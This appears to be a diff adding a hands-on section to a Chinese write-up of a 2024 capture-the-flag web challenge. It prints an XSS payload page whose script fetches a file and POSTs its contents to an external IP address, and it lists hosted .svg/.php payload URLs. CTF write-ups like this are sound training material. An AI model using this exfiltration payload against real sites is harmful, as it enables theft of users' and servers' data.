@@ -15,3 +15,40 @@
 http://bfs.iloli.moe/po7mn1.svg
 http://bfs.iloli.moe/po7mn1.php
 ```
+
+### 实战
+
+2024网鼎杯青龙组 web2
+
+准备payload
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="test1.js">
+    </script>
+</head>
+<body>
+    111
+    <script>
+        fetch('http://3.88.127.66/flag.txt').then(response => response.text()).then(data => {
+            fetch('http://3.88.127.66/xss-glitch.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: "content=123" + data
+            })
+        })
+    </script>
+</body>
+</html>
+```
+
+然后插爆服务器拿到flag
+
+![image-20241030152616320](./assets/image-20241030152616320.png)
